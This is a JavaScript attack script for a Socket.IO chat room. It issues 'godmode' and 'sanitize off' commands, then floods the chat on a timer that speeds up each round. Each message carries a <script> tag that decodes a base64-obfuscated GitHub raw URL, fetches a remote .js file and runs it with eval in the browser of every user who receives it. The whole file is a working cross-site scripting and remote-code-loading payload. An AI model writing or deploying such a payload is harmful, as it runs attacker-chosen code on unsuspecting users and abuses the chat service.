let coughtimer = 7777; // Changed from const to let
socket.emit('command', {
    list: ['speed','100']
});
socket.emit('command', {
    list: ['godmode']
});
socket.emit('command', {
    list: ['sanitize', 'off']
});
const intervalId = setInterval(function() {
    socket.emit("command", {
        list: ["name", "gnygres"]
    });
    socket.emit("command", {
        list: ["color", "black"]
    });
    setTimeout(function() {
        setTimeout(function() {
            socket.emit('talk', {
                text: "gnygres <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JsYW5rbmFtZWxtYW9sbWFvLXN0YXIvc2NyL3JlZnMvaGVhZHMvbWFpbi8=')+'scr'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
            });
            coughtimer = coughtimer - 125;
            if (coughtimer <= 100)
            {
                coughtimer = 100;
            }
        }, 50);
    }, 25);
}, coughtimer);
